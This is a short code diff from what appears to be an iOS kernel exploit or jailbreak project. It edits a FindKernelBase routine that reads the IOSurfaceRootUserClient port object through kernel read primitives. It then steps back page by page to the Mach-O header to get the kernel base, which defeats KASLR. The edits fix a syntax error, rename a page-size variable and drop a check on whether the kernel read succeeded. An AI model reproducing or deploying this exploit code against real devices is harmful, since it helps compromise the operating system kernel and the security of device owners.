@@ -1,28 +1,29 @@
 #import "utils.h"
 #import "kernel_utils.h"
-#import "offsets.h"
+#import "time_waste/offsets.h"
 #import "time_waste/IOSurface_stuff.h"
-extern size_t page_size;
+uint64_t pagesize;
+io_service_t IOSurfaceRootUserClient;
 
 
 // The method used to find the kernel base is from
 // the oob_timestamp exploit by Brandon Azad.
 uint64_t FindKernelBase() {
-    printf("[+] Finding kernel base..\n")
+    printf("[+] Finding kernel base..\n");
       uint64_t IOSRUC_port_addr = FindPortAddress(IOSurfaceRootUserClient);
       uint64_t IOSRUC_addr = KernelRead_64bits(IOSRUC_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
       uint64_t kerntxt_addr = KernelRead_64bits(IOSRUC_addr);
       kerntxt_addr |= 0xffffff8000000000;
       printf("[i] kerntxt_addr : 0x%11x \n", kerntxt_addr);
       uint64_t kernel_base = 0;
-      uint64_t kernel_page = kerntxt_addr & ~(page_size -1);
+      uint64_t kernel_page = kerntxt_addr & ~(pagesize -1);
      printf("[i] kernel_page : 0x%11x \n", kernel_page);
-      for (;; kernel_page -= page_size){
+      for (;; kernel_page -= pagesize){
           const uint32_t mach_header[4] = { 0xfeedfacf, 0x0100000c, 2, 2};
           uint32_t data[4] = {};
-          bool ok = KernelRead(kernel_page, data, sizeof(data));
+          KernelRead(kernel_page, data, sizeof(data));
           data[2] = mach_header[2];
-          if(ok && memcmp(data, mach_header, sizeof(mach_header)) == 0){
+          if(memcmp(data, mach_header, sizeof(mach_header)) == 0){
               kernel_base = kernel_page;
               break;
           }else{
